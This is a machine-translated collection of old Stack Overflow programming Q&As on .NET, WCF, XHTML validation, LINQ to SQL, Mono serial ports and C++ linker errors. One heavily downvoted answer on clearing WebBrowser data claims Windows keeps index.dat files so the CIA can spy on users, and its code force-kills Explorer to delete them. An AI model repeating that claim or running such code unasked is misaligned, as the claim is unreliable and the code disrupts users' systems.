> 标签：c#, .net, pinvoke

我使用 PInvoke 更改了我的客户系统的时区。而不是我只想更改我的应用程序的时区。是否有解决方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-12T04:53:07.483

您可以简单地将时区信息存储在内存中吗？您还应该能够序列化这些数据，以便在应用程序执行之间持久保存。

这样，您的应用程序可以存在于完全由您选择的时区中，而与您机器的时间（和位置）无关。

[TimeZone](http://msdn.microsoft.com/en-us/library/system.timezone(VS.71).aspx)类应该是您需要做的一个很好的起点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-06T05:59:34.513

不，这是不可能的。时区设置是系统范围的。.NET 不提供任何方法来基于每个应用程序更改本地时区。

# wpf - 响应式 WCF 客户端的双工回调或客户端线程

> ID：434443
> 
> 赞同：4
> 
> 时间：2009-01-12T04:32:54.497
> 
> 标签：wpf, wcf, multithreading, duplex

我有一项服务，其中特定功能的调用时间比其他服务要长，有时它们可​​能需要几秒钟才能返回。为了防止客户端的 UI 在发生这种情况时被阻止，首选的解决方案是：

1.  使用双工通道并在接收到数据时简单地使用回调来更新 UI。
2.  使用单独的线程调用服务，简单的使用request-reply操作，然后在返回数据时更新ui线程。

哪种解决方案更好，尤其是在互操作性受到青睐但并非绝对必要的情况下，并且在您看来，哪个解决方案的实施和维护更快（更清洁）？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-12T12:05:19.950

如果你实现了回调契约，那么你就不需要客户端实现多线程代码。在使用 .Net 客户端时，这可能不是一个显着的优势（因为 VS 会自动为您生成异步代理代码），但在使用其他平台/语言的客户端时可能会被证明是有益的。

哪个更干净？好吧，这取决于您是客户端还是服务器开发人员。如果，正如我在您的情况下所怀疑的那样，您两者都是，并且您可以将 .Net 用于客户端和服务器，那么我可能会暂时避免回调。如果您暗示服务调用需要 45 秒，那么我会说回叫合同，这确实是主观的，但如果我要伸出脖子，那么我会说如果响应时间超过 5 秒那么是时候转向回调了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T04:42:52.370

您应该实施[CallBackcontract](http://msdn.microsoft.com/en-us/library/system.servicemodel.servicecontractattribute.callbackcontract.aspx)。

这是一个[例子](http://dotnetaddict.dotnetdevelopersjournal.com/wcf_alarmclock.htm)。

# jquery - 扩展 XHTML

> ID：434450
> 
> 赞同：8
> 
> 时间：2009-01-12T04:38:26.093
> 
> 标签：jquery, xhtml, xsd, dtd

我正在尝试编写一个使用属性来定义表单验证行为的 jQuery 插件（是的，我知道已经有一个验证插件；这与我将要使用的东西一样是一个学习练习）。理想情况下，我想要这样的东西：

示例 1 - 输入：

```
<input id="name" type="text" v:onvalidate="return this.value.length > 0;" /> 
```

示例 2 - 包装器：

```
<div v:onvalidate="return $(this).find('[value]').length > 0;">
   <input id="field1" type="text" />
   <input id="field2" type="text" />
   <input id="field3" type="text" />
</div> 
```

示例 3 - 预定义：

```
<input id="name" type="text" v:validation="not empty" /> 
```

这里的目标是让我的 jQuery 代码找出需要验证哪些元素（这已经完成），并且标记仍然是有效的 XHTML，这就是我遇到的问题。我相当确定这将需要DTD 和XML Schema 的组合，但我不太确定如何执行。

基于[这篇文章](http://www.w3.org/TR/xhtml-modularization/dtd_developing.html#s_dev_attrs)，我创建了以下 DTD：

```
<!ENTITY % XHTML1-formvalidation1
    PUBLIC  "-//W3C//DTD XHTML 1.1 +FormValidation 1.0//EN"
            "http://new.dandoes.net/DTD/FormValidation1.dtd" >
%XHTML1-formvalidation1;

<!ENTITY % Inlspecial.extra 
  "%div.qname; " >

<!ENTITY % xhmtl-model.mod
    SYSTEM "formvalidation-model-1.mod" >  
<!ENTITY % xhtml11.dtd
    PUBLIC  "-//W3C//DTD XHTML 1.1//EN"
            "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd" >
%xhtml11.dtd; 
```

这是“formvalidation-model-1”：

```
<!ATTLIST %div.qname;
    %onvalidation   CDATA   #IMPLIED
    %XHTML1-formvalidation1.xmlns.extra.attrib;
> 
```

我以前从未做过 DTD，所以我什至不确定我在做什么。当我通过 W3 XHTML 验证器运行我的页面时，我得到了 80 多个错误，因为它得到了所有 XHTML 元素的重复定义。我至少在正确的轨道上吗？有什么建议么？

* * *

**编辑：** 我从我的自定义 DTD 中删除了这一部分，因为结果证明它实际上是自引用的，而我从中获取模板的代码实际上是将两个 DTD 合并为一个，而不是将特定项目附加到一个：

```
<!ENTITY % XHTML1-formvalidation1
    PUBLIC  "-//W3C//DTD XHTML 1.1 +FormValidation 1.0//EN"
            "http://new.dandoes.net/DTD/FormValidation1.dtd" >
%XHTML1-formvalidation1; 
```

我也删除了这个，因为它没有验证，并且似乎没有做任何事情：

```
<!ENTITY % Inlspecial.extra 
  "%div.qname; " > 
```

另外，我决定，由于我只添加了一些额外的项目，W3 推荐的单独文件模型似乎并没有那么有用，所以我将所有内容都放入了 dtd 文件，其内容现在是：

```
<!ATTLIST div onvalidate CDATA  #IMPLIED>
<!ENTITY % xhtml11.dtd
    PUBLIC  "-//W3C//DTD XHTML 1.1//EN"
            "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd" >
%xhtml11.dtd; 
```

所以现在，我没有收到任何与 DTD 相关的验证错误，但 onvalidate 属性仍然无效。

**更新：**我放弃了 DTD 并添加了一个模式：http: [//schema.dandoes.net/FormValidation/1.0.xsd](http://schema.dandoes.net/FormValidation/1.0.xsd)

使用 v:onvalidate 似乎可以在 Visual Studio 中进行验证，但 W3C 服务仍然不喜欢它。

这是我正在使用它的页面，因此您可以查看源代码：

[http://new.dandoes.net/auth](http://new.dandoes.net/auth)

这是 w3c 验证结果的链接：

[http://validator.w3.org/check?uri=http://new.dandoes.net/auth&charset=(detect+automatically)&doctype=Inline&group=0](http://validator.w3.org/check?uri=http://new.dandoes.net/auth&charset=(detect+automatically)&doctype=Inline&group=0)

这是否与我能做到的一样接近，还是我仍然做错了什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-01-12T17:16:36.437

如果您希望结果是有效的 XHTML，我相信您将需要使用[XML 名称空间](http://www.w3.org/TR/xml-names11)而不是自定义 DTD。DTD 不仅*定义*了语言（因此，自定义 DTD 不是“真正的”XHTML），而且它会将任何读取它的浏览器抛出[quirks mode](http://en.wikipedia.org/wiki/Quirks_mode)，即使它们不会阻塞文件。

另一方面，使用命名空间将产生完全有效的 XHTML（尽管并非所有验证器都可以识别命名空间并且可能无法正确验证它）并允许浏览器在（接近）标准模式下工作。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="http://example.com/ns/validation" xml:lang="en">
    <head><title>Validation Example</title></head>

    <body>
        <input id="name1" type="text" v:onvalidate="return this.value.length &gt; 0;"/>
        <input id="name2" type="text" v:validation="not empty"/>
    </body>
</html> 
```

# c# - 使用代码隐藏从位图变量显示图像

> ID：434452
> 
> 赞同：1
> 
> 时间：2009-01-12T04:39:07.073
> 
> 标签：c#, asp.net, image, code-behind

我希望创建一个非常简单的网络应用程序，它只是根据日期（来自日历点击事件）或关键字搜索显示来自数据库的图像，获取图像没有问题，但我不'不知道如何显示结果图像。最好我想在表格或网格或其他任何东西中显示图像，与我用来获取搜索条件的同一页面上的日历和文本框相邻

那么如何将图像从代码隐藏位图变量流式传输到页面？

编辑：该数据库是云数据库，因此数据绑定已失效。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T05:02:44.373

在 CodePlex ASP.NET Futures 网站上查看适用于 ASP.NET 的 DynamicImageHandler：

[http://www.hanselman.com/blog/ASPNETFuturesGeneratingDynamicImagesWithHttpHandlersGetsEasier.aspx](http://www.hanselman.com/blog/ASPNETFuturesGeneratingDynamicImagesWithHttpHandlersGetsEasier.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T05:05:07.817

如果您手头没有物理文件，请尝试使用：

`Response.OutputStream.Write(bitmapbuffer, bitmapbuffer.Length)`

我过去曾这样做以动态提供 pdf 和 tif，并且效果很好。您需要设置 img 的 src 属性以包含您需要的信息。这个网站有一个接近你正在寻找的例子：

[http://www.jigar.net/articles/viewhtmlcontent3.aspx](http://www.jigar.net/articles/viewhtmlcontent3.aspx)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2009-01-12T04:43:48.920

这不是一个好主意，因为您不知道何时释放资源。

相反，创建一个页面（或页面处理程序等），它将采用查询字符串中所需的参数来执行数据库中的查找以获取图像。

然后，在处理程序中，您从数据库加载图像，然后通过页面将字节流回。

在原始页面中，您将 img 标记的 src 属性设置为其他页面，并使用适当的参数。

# c# - 如何清除 System.Windows.Forms.WebBrowser 会话数据？

> ID：434469
> 
> 赞同：25
> 
> 时间：2009-01-12T04:49:01.733
> 
> 标签：c#, .net, browser, webbrowser-control

如何在不重新启动应用程序的情况下清除当前会话数据（cookie、缓存数据、身份验证会话等）？

更新：我说的是 Windows.Forms 中的 WebBrowser 控件，而不是 ASP.Net 会话。

* * *

## 回答 #1

> 赞同：52
> 
> 时间：2009-12-09T05:45:06.277

要清除会话（例如 HttpOnly cookie），您可以使用 wininet.dll 中的 InternetSetOption()。

```
private const int INTERNET_OPTION_END_BROWSER_SESSION = 42;

[DllImport("wininet.dll", SetLastError = true)]
private static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int lpdwBufferLength); 
```

并在需要清除会话时使用此方法。

```
InternetSetOption(IntPtr.Zero, INTERNET_OPTION_END_BROWSER_SESSION, IntPtr.Zero, 0);
webBrowser1.Document.Window.Navigate(url); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-08-06T15:00:29.480

如果您启用了 javascript，您可以使用此代码片段来清除以清除网络浏览器当前所在站点的 cookie（除此之外，我还没有找到清除会话 cookie 的方法）。

```
webBrowser.Navigate("javascript:void((function(){var a,b,c,e,f;f=0;a=document.cookie.split('; ');for(e=0;e<a.length&&a[e];e++){f++;for(b='.'+location.host;b;b=b.replace(/^(?:%5C.|[^%5C.]+)/,'')){for(c=location.pathname;c;c=c.replace(/.$/,'')){document.cookie=(a[e]+'; domain='+b+'; path='+c+'; expires='+new Date((new Date()).getTime()-1e11).toGMTString());}}}})())") 
```

它源自此用于清除 cookie的[书签。](http://ostermiller.org/bookmarklets/cookies.html)

除此之外，您可以删除“C:\Documents and Settings\username\Cookies”文件夹的内容（减去通常被锁定的 index.dat）。

至于缓存的数据，只需删除“C:\Documents and Settings\username\Local Settings\Temporary Internet Files”中的所有文件就足够了。

如果您*确实*需要能够清除所有站点的 cookie，从长远来看，您最好使用 axWebBrowser 控件之类的东西。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2010-06-28T19:42:59.160

我尝试了一切来清除表单数据，以便下一个用户不会看到以前的电子邮件地址等。我最终这样做是为了清除 cookie ......

```
string[] theCookies = System.IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Cookies));
foreach (string currentFile in theCookies)
{
   try
   {
      System.IO.File.Delete(currentFile);
   }
   catch (Exception ex)
   {
   }
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-11-16T17:14:28.547

```
Private Const INTERNET_OPTION_END_BROWSER_SESSION As Integer = 42

    <DllImport("wininet.dll", SetLastError:=True)>
    Public Shared Function InternetSetOption(hInternet As IntPtr, dwOption As Integer, lpBuffer As IntPtr, lpdwBufferLength As Integer) As Boolean
    End Function

    Private Sub WebBrowserFormName_Closed(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Closed
        InternetSetOption(IntPtr.Zero, INTERNET_OPTION_END_BROWSER_SESSION, IntPtr.Zero, 0)
    End Sub 
```

只是为在VB中寻找这个答案的人发帖。快乐编码！！！

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-04-15T22:35:34.637

webBrowser1.Document.Cookies = "" 不起作用。此调用不会清除 cookie。webBrowser1.Document.Cookies = 仅在 javascript 中用作 document.cookie。您应该找到要清除的 cookie，即 'Session'，使用 webBrowser1.Document.Cookies = "Session = ''"; 它只会根据需要将 cookie 设置为 ''。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-05-13T09:54:11.317

以下解决方案对我有用 -

```
webBrowser1.Document.ExecCommand("ClearAuthenticationCache", false, null); 
```

这是在以下帖子中建议的删除 cookie - [https://stackoverflow.com/a/21512662/6291511](https://stackoverflow.com/a/21512662/6291511)

您可以在此处找到有关此的更多信息 - [https://msdn.microsoft.com/en-us/library/system.windows.forms.htmldocument.execcommand(v=vs.110).aspx](https://msdn.microsoft.com/en-us/library/system.windows.forms.htmldocument.execcommand(v=vs.110).aspx)

希望能帮助到你！！！

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-03-04T22:54:18.703

您必须意识到，从 Web 服务器的角度来看，跟踪“会话状态”的方式是为客户端浏览器提供一个带有会话 ID 的 cookie。当浏览器回传到服务器时，该 cookie 允许服务器将请求与存储的会话状态相关联。

所以解决办法就是清除webBrowser控件的cookies。例如 webBrowser1.Document.Cookies = ""，我认为应该可以。

ASP.NET 也有所谓的“无cookie 会话”，它通过将会话ID 添加到url 来工作。因此，如果这是服务器使用的机制，您可以尝试将其从 url 中过滤掉。但是你不会看到那么多，它主要是基于 cookie 的会话状态。

* * *

## 回答 #8

> 赞同：-6
> 
> 时间：2010-11-06T20:41:01.343

Windows 7 使用 index.dat 文件来存储 cookie 和历史记录，以便 Bill 和他在 CIA 中心的朋友可以窥探您并尽其所能确保您无法删除这些文件，并且在复制后因为“特殊文件夹”是Windows 运行时，已使用并且 .Dat 文件保持锁定状态。

这不是一个完美的解决方案，但它在某种程度上适用于列表中的完整文件名。

```
int DeletedCount = 0;
        int CouldNotDelete = 0;
        KillExplorer();
        foreach (string DatFile in DatFiles)
        {//Do not put break point or step into the code else explorer will start and the file will become locked again
            DirectoryInfo DInfo=new DirectoryInfo(DatFile.Replace("index.dat",""));
            FileAttributes OldDirAttrib = DInfo.Attributes;
            DInfo.Attributes  = FileAttributes.Normal;//Set to normal else can not delete
            FileInfo FInfo = new FileInfo(DatFile);
            FileAttributes OldFileAttrib = FInfo.Attributes;
            SetAttr(FInfo, FileAttributes.Normal);
            TryDelete(FInfo);
            SetAttr(FInfo, OldFileAttrib);//Sets back to Hidden,system,directory,notcontentindexed
            if (File.Exists(DatFile))
                CouldNotDelete++;
            else
                DeletedCount++;

        }
        if (DatFiles.Count>0)//Lets get explorer running again
            System.Diagnostics.Process.Start(DatFiles[DatFiles.Count - 1].Replace("index.dat", ""));
        else
            System.Diagnostics.Process.Start("explorer");
        System.Windows.Forms.MessageBox.Show("Deleted " + DeletedCount + " Index.dat files with " + CouldNotDelete + " Errors");

        return "Deleted " + DeleteFileCount + " Files ";
    }

    private void KillExplorer()
    {
        foreach (Process P in Process.GetProcesses())
        {//Kill both these process because these are the ones locking the files
            if (P.ProcessName.ToLower() == "explorer")
                P.Kill();
            if (P.ProcessName.ToLower() == "iexplore")
                P.Kill();
        }
    }

    private bool TryDelete(FileInfo Info)
    {
        try
        {
            Info.Delete();
            return true;
        }
        catch 
        {return false;}
    }

    private void SetAttr(FileInfo Info,FileAttributes Attr)
    {
        try
        {
            Info.Attributes = Attr;
        }
        catch { }
    } 
```

# c# - 在 LINQ to SQL 中，如何将 LINQ 查询的一部分传递给函数

> ID：434480
> 
> 赞同：9
> 
> 时间：2009-01-12T04:53:50.163
> 
> 标签：c#, linq, linq-to-sql, expression-trees

是否可以将 linq 查询的一部分传递给函数？我想为我的 DAL 创建一个始终使用相同查询接口的通用接口。例如，

```
List<T> Get(Join j, Where w, Select s){    
    return currentDataContext<T>.Join(j).Where(w).Select(s).ToList();    
} 
```

这种事情可能吗？我认为这将使用表达式树来完成，但我无法找到它的示例。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-01-12T06:25:51.603

好吧，“加入”很棘手，因为很难表达加入 - 但是像 where / select / orderby 这样的事情很容易......

真的，这只是在 上组合各种 LINQ 方法的情况`IQueryable<T>`，这些方法通常接受`Expression<Func<...>>`某种组合。因此，带有可选谓词的基本选择将是：

```
 public IQueryable<T> Get<T>(
        Expression<Func<T,bool>> predicate
        ) where T : class
    {
        IQueryable<T> query = (IQueryable<T>)GetTable(typeof(T));
        if (predicate != null) query = query.Where(predicate);
        return query;
    } 
```

我也倾向于返回`IQueryable<T>`，因为它是完全可组合的。如果调用者想要一个列表，他们总是可以使用`ToList()`它......或者（例如）：

```
 using(var ctx = new MyDataContext(CONN))
    {
        ctx.Log = Console.Out;
        int frCount = ctx.Get<Customer>(c => c.Country == "France").Count();
    } 
```

哪个（使用 Northwind）进行查询：

```
SELECT COUNT(*) AS [value]
FROM [dbo].[Customers] AS [t0]
WHERE [t0].[Country] = @p0 
```

在查询中包含“选择”（投影）的问题是您最终会得到多个泛型类型。由于您经常希望投影是匿名类型，因此几乎不可能指定投影类型（匿名）**和**表类型，并且它是不可调用的。

实际上，我想知道编写这样的方法是否有很多好处。我可能会坚持使用基本方法：

```
 public IQueryable<T> Get<T>() where T : class
    {
        return (IQueryable<T>)GetTable(typeof(T));
    } 
```

并让调用者以他们喜欢的方式编写它——也许使用查询语法：

```
 var list = (from cust in ctx.Get<Customer>()
                   where cust.Country == "France"
                   select cust.CompanyName).Take(10).ToList(); 
```

哪个用途：

```
SELECT TOP (10) [t0].[CompanyName]
FROM [dbo].[Customers] AS [t0]
WHERE [t0].[Country] = @p0 
```

* * *

或者，如果您确实想包含 order by 和 projection，那么扩展方法是最实用的方法；那么您不需要指定原始（源） T （这就是在与匿名类型混合时使其不可调用的原因）：

```
public static class QueryExtension
{
    public static IQueryable<TProjection>
        Get<TSource, TProjection, TOrderKey>(
            this IQueryable<TSource> source,
            Expression<Func<TSource, bool>> where, // optional
            Expression<Func<TSource, TProjection>> select,
            Expression<Func<TProjection, TOrderKey>> orderBy)
    {
        if (where != null) source = source.Where(where);
        return source.Select(select).OrderBy(orderBy);
    }
} 
```

然后考虑一个 DAL 方法，例如：

```
 public List<string> Countries()
    {
        return Customers.Get(
            x=>x.CompanyName != "",
            x=>x.Country,
            x=>x).Distinct().ToList();
    } 
```

使用（再次，与罗斯文）：

```
SELECT DISTINCT [t0].[Country]
FROM [dbo].[Customers] AS [t0]
WHERE [t0].[CompanyName] <> @p0 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-12T05:25:08.090

检查这个通用类：[TableView.cs](http://blogs.msdn.com/kfarmer/archive/2007/11/13/encapsulation-and-linq-to-sql.aspx)。

它基本上使用 Func<TEntity, bool> 委托来应用 Where 谓词：

```
//...
public TableView(DataContext dataContext, Expression<Func<TEntity, bool>> predicate)
{
    this.table = dataContext.GetTable<TEntity>();
    this.baseQuery = table.Where(predicate);
    this.predicate = predicate.Compile();
}
//... 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T09:50:47.147

您可以使用 Linq 示例提供的动态表达式库，使用此扩展库，您可以为 where 等传递 linq 子句...

可从此处下载 [linq 示例](http://msdn.microsoft.com/en-us/vcsharp/bb894665.aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T05:22:24.647

您可以使用[动态 LINQ](http://weblogs.asp.net/scottgu/archive/2008/01/07/dynamic-linq-part-1-using-the-linq-dynamic-query-library.aspx)并将参数作为字符串传递。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-04T03:03:51.700

Marc Gravell♦ 像往常一样提供了一个非常有见地的答案，但我真的认为拥有采用*IQueryables*并添加限制的方法在大多数情况下都可以工作，并且它们使代码更清晰且易于维护。例如：

```
//Join
public static IQueryable<IContract> AllContracts(this IQueryable<IAccount> accounts, ISession s ) {
          return from a in accounts
                 from contract in s.Query<IContract()
                 where (a.Id == contract.AccountId)
                 select contract;
    }
//Where
public static IQueryable<IContract> Active(this IQueryable<IContract> contracts) {
          return from contract in contracts
                 where (contract.Active == true)
                 select contract;
    } 
```

然后你可以像这样混合和匹配这些：

```
IQueryable<IContract> activeContracts = s.Query<IAccount>()
            .Where(o => o.Name == "XXX")
            .GetContracts(s)
            .Active(); 
```

我在这里使用扩展方法和 NHiberante 的 LINQ 提供*Query*方法，但这很容易在没有静态方法和任何 LINQ 提供程序的情况下重写。

# javascript - 仅使用 javascript 的 Flex？

> ID：434491
> 
> 赞同：0
> 
> 时间：2009-01-12T04:59:33.600
> 
> 标签：javascript, apache-flex, actionscript-3

您是否尝试过在 Flex 应用程序中使用直接的 javascript（而不是直接的 ECMAscript 3 标准），而没有任何 ECMAScript 4 增强功能？

如果要这样做，是让 AS3 编译器从 javascript 构建，还是自由使用 javascript 桥更好？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-12T20:38:45.750

我不确定您为什么要在 Flex 应用程序中这样做，但我在 Flash Player 中使用了非严格的 ECMAScript，这当然很有趣。确保为编译器设置以下命令行参数，并通过原型和很少的类型检查获得所有你想要的乐趣。

```
-as3=false -es=true -strict=false 
```

如果您的 ECMAScript 将与 Flex 应用程序进行大量通信，最好在 Flash Player 中运行它，原因有两个：

1) Flash Player 中的虚拟机比某些（如果不是全部）浏览器 JavaScript 引擎更快。Firefox JavaScript 引擎速度的大部分改进最近都来自开源 Flash Player VM Tamarin。

2) 通过 ExternalInterface 传递许多调用可能是一个缓慢的过程。需要转换对象并且需要解析一些疯狂的 XML。保持所有代码在一侧运行，您将获得更好的性能。

# .net - 用于多个平台的 Mono 中的串行端口 (rs232)

> ID：434494
> 
> 赞同：3
> 
> 时间：2009-01-12T05:00:44.270
> 
> 标签：.net, mono, cross-platform, clr, serial-port

我计划在 .NET 中重新编写一个 Win32 应用程序（本机 C++）——很可能使用单声道，这样我就可以在 Win32、Linux 和 mac 上运行它。我试图解决的问题（仅真正为 Win32 开发）是串行端口定义的问题。当只有一个可执行文件时，通常如何识别平台差异。具体来说，COM 端口在 Windows 中被标识为 COM1 或类似的东西 (\.\COM)，但在 linux 上它们被指定为 /dev/ttyS0 之类的东西。

是否在运行时检查平台以获取此信息？

我认为唯一的区别在于港口的开放和关闭。读和写是一样的。

也许这是一个更通用的问题，因为它适用于 mono/.NET 中任何特定于平台的东西。

你怎么处理这个？在一些字符串资源或配置文件中，还是基于运行时平台的硬编码和切换？

有任何代码示例吗？请注意，我是一名 C++ 开发人员，并不熟悉 .NET 中可用的所有类。有没有办法从 CLR 获取串行端口命名方案，或者有没有办法从 CLR 获取操作系统/平台？

如果 CLR 能够以更独立的方式呈现串行端口，那就太好了。也许那是不可能的。

谢谢，蒂姆

编辑

鉴于到目前为止的一个响应，我想我应该
先尝试 SerialPort.GetPortNames() 枚举，看看它是否有效。（在两个平台上）

在 win32 中用于更高的端口号和 USB 加密狗 - 它不像基本的 COM 端口枚举那么简单。

我将在这里报告调查结果。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-12T12:04:48.970

在 .Net 中，您需要 System.IO.Ports。“COM1”和“/dev/ttyS0”之类的名称是随机的操作系统名称。为什么需要对它们进行硬编码？用户应该从可用端口列表中选择一个。

显然，您在运行时确定此列表。事实上，对于 USB 转串口适配器，您可能需要考虑用户在启动程序后才发现他忘记连接他的 USB 转串口适配器的可能性。这意味着您应该在每次显示配置对话框时重新阅读此列表。USB适配器很可能不是COM1，顺便说一句。

（我不能保证 SerialPort 的 Mono 实现的质量。快速的谷歌搜索让我有点担心，但你自己测试一下）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2011-07-13T12:50:04.747

我看了一下这个，似乎用于枚举串行端口的单声道代码除了 Linux 之外什么都不能工作。

（来自 mcs/class/System/System.IO.Ports/SerialPort.cs）

```
 public static string [] GetPortNames ()
            {
                    int p = (int) Environment.OSVersion.Platform;
                    List<string> serial_ports = new List<string>();

                    // Are we on Unix?
                    if (p == 4 || p == 128 || p == 6) {
                            string[] ttys = Directory.GetFiles("/dev/", "tty*");
                            foreach (string dev in ttys) {
                                    if (dev.StartsWith("/dev/ttyS") || dev.StartsWith("/dev/ttyUSB"))
                                            serial_ports.Add(dev);
                            }
                    } else { 
```

在 OSX 上，我认为您可能匹配 /dev/tty.*（FreeBSD 需要 /dev/ttyU[0-9]+）

我不能说我很喜欢它选择在哪个操作系统下运行的方式..

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-14T16:21:01.833

刚刚发现了这个线程，并认为我应该添加我的发现：随机，我也担心在 mac 上这个问题。在 Windows 和 Linux 中（在 VS 和 Mono 中） SerialPort.GetPortNames() 返回一个列表，具有以下规则：

1）Windows返回一个字符串列表，如Com1，Com4，遗漏任何不存在的字符串（USB串行适配器似乎根据插入的插头采用COM号，一致）来自我的串行端口扫描仪：

`Scanning COM1 Scanning COM4 Scanning Complete`

2) Linux 返回 linux 发行版的编译器已启用的所有可能的 tty 串行端口。这似乎是大约 8 个端口，如果您尝试打开这些端口，将引发异常（来自我的串行端口扫描仪：

`Scanning /dev/ttyS0 Scanning /dev/ttyS1 Port FailedSystem.IO.IOException: I/O Error at System.IO.Ports.SerialPortStream..ctor (System.String portName, Int32 baudRate, Int32 dataBits, Parity parity, StopBits stopBits, Boolean dtrEnable, Boolean rtsEnable, Handshake handshake, Int32 readTimeout, Int32 writeTimeout, Int32 readBufferSize, Int32 writeBufferSize) [0x00000] at (wrapper remoting-invoke-with-check) System.IO.Ports.SerialPortStream:.ctor (string,int,int,System.IO.Ports.Parity,System.IO.Ports.StopBits,bool,bool,System.IO.Ports.Handshake,int,int,int,int) at System.IO.Ports.SerialPort.Open () [0x00000] at (wrapper remoting-invoke-with-check) System.IO.Ports.SerialPort:Open () at HSMScanner.Program.Main (System.String[] args) [0x00000] Scanning /dev/ttyS2 Port FailedSystem.IO.IOException: I/O Error at System.IO.Ports.SerialPortStream..ctor (System.String portName, Int32 baudRate, Int32 dataBits, Parity parity, StopBits stopBits, Boolean dtrEnable, Boolean rtsEnable, Handshake handshake, Int32 readTimeout, Int32 writeTimeout, Int32 readBufferSize, Int32 writeBufferSize) [0x00000] at (wrapper remoting-invoke-with-check) System.IO.Ports.SerialPortStream:.ctor (string,int,int,System.IO.Ports.Parity,System.IO.Ports.StopBits,bool,bool,System.IO.Ports.Handshake,int,int,int,int) at System.IO.Ports.SerialPort.Open () [0x00000] at (wrapper remoting-invoke-with-check) System.IO.Ports.SerialPort:Open () at HSMScanner.Program.Main (System.String[] args) [0x00000] Scanning /dev/ttyS3 Port FailedSystem.IO.IOException: I/O Error at System.IO.Ports.SerialPortStream..ctor (System.String portName, Int32 baudRate, Int32 dataBits, Parity parity, StopBits stopBits, Boolean dtrEnable, Boolean rtsEnable, Handshake handshake, Int32 readTimeout, Int32 writeTimeout, Int32 readBufferSize, Int32 writeBufferSize) [0x00000] at (wrapper remoting-invoke-with-check) System.IO.Ports.SerialPortStream:.ctor (string,int,int,System.IO.Ports.Parity,System.IO.Ports.StopBits,bool,bool,System.IO.Ports.Handshake,int,int,int,int) at System.IO.Ports.SerialPort.Open () [0x00000] at (wrapper remoting-invoke-with-check) System.IO.Ports.SerialPort:Open () at HSMScanner.Program.Main (System.String[] args) [0x00000]`

3) 麦克斯...

哦亲爱的哦亲爱的。Mac（当插入 USB 串行端口并且驱动程序和一切正常时）不会在 GetPortNames() 上返回*任何内容。*纳达。在 /dev/tty 中查看，额外的设备仅在插入设备并具有 /dev/tty.usbserial-A7006Ro7 之类的名称时才会出现，不幸的是，使用此名称作为程序的参数，然后是 serial.open dosnt 似乎有什么影响。

更深入地研究它。

# asp.net-mvc - ASP.NET MVC 应用程序中的 robots.txt 返回 404

> ID：434515
> 
> 赞同：1
> 
> 时间：2009-01-12T05:13:55.833
> 
> 标签：asp.net-mvc, deployment, iis-6

我已经在根目录中部署了一个带有 robots.txt 文件的 ASP.NET MVC 站点，但是当我尝试访问此 url 时，它返回 404。我在根目录中也有一个 .xml 和一个 .html 文件，它们返回有效内容。

我在 IIS 6 上运行它。我尝试将 .txt 作为“文本/纯文本”添加到 MIME 类型，但没有运气。

建议？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T05:43:17.867

你看过 IIS 中的扩展映射吗？文件扩展名可以与处理程序相关联，并且它可能映射到 ASP.NET dll。确保 robots.txt 也位于您网站的根目录。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-08-22T07:59:37.940

检查您的 web.config。它可能会阻止对它的访问，就像 /Views 文件夹中的 web.config 阻止对所有视图页面的直接访问一样。

# c++ - 任何人都知道如何修复编译错误：LNK2005？（里面有源代码）

> ID：434522
> 
> 赞同：2
> 
> 时间：2009-01-12T05:17:29.743
> 
> 标签：c++, visual-studio, visual-c++

我在 stdafx.h 中有以下代码。

```
using namespace std;

typedef struct {
    DWORD   address;
    DWORD   size;
    char    file[64];
    DWORD   line;
} ALLOC_INFO;

typedef list<ALLOC_INFO*> AllocList;
//AllocList *allocList; 
```

没有注释代码（最后一行），它编译得很好。但是当我添加注释代码时，我收到以下错误。

> 错误 LNK2005: "class std::list > * allocList" (?allocList@@3PAV?$list@PAUALLOC_INFO@@V?$allocator@PAUALLOC_INFO@@@std@@@std@@A) 已经在 test.obj 中定义

我正在使用 Visual Studio .NET 2003。任何人都知道那是什么以及如何解决它？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-01-12T05:20:34.353

不要将*定义*放在头文件中，只放在*声明*中。声明指定某些东西存在，而定义实际定义它们（通过分配空间）。例如`typedef`,`extern`和函数原型都是声明，而`struct`,`int`和函数体是定义。

发生的情况是，您很可能将 stdafx.h 包含在多个编译单元（C++ 源文件）中，并且每个生成的目标文件都获得了自己的`allocList`.

然后，当您将对象链接在一起时，有两个（或更多）事物称为`allocList`，因此出现链接错误。

你最好*声明*变量：

```
extern AllocList *allocList; 
```

